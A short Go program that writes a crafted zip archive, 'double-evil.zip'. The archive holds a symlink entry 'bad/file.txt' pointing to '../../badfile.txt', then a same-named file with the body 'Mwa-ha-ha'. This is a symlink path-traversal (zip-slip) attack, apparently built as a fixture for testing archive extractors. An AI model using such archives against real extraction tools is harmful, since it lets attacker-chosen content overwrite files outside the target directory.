package main

import (
	"log"
	"os"
	"time"

	"github.com/klauspost/compress/zip"
)

func main() {
	// Create a buffer to write our archive to.
	fw, err := os.Create("double-evil.zip")
	if nil != err {
		log.Fatal(err)
		return
	}

	// Create a new zip archive.
	w := zip.NewWriter(fw)

	// Write the evil symlink
	h := &zip.FileHeader{
		Name:     "bad/file.txt",
		Method:   zip.Deflate,
		Modified: time.Now(),
	}
	h.SetMode(os.ModeSymlink)
	header, err := w.CreateHeader(h)
	if err != nil {
		log.Fatal(err)
	}
	// The evil symlink points outside of the target directory
	_, err = header.Write([]byte("../../badfile.txt"))
	if err != nil {
		log.Fatal(err)
	}

	// Write safe files to the archive.
	var files = []struct {
		Name, Body string
	}{
		{"goodfile.txt", "hello world"},
		{"morefile.txt", "hello world"},
		{"bad/file.txt", "Mwa-ha-ha"},
	}
	for _, file := range files {
		h := &zip.FileHeader{
			Name:     file.Name,
			Method:   zip.Deflate,
			Modified: time.Now(),
		}

		header, err := w.CreateHeader(h)
		if err != nil {
			log.Fatal(err)
		}

		_, err = header.Write([]byte(file.Body))
		if err != nil {
			log.Fatal(err)
		}
	}

	// close the in-memory archive so that it writes trailing data
	if err = w.Close(); err != nil {
		log.Fatal(err)
	}

	// close the on-disk archive so that it flushes all bytes
	if err = fw.Close(); err != nil {
		log.Fatal(err)
		return
	}
}
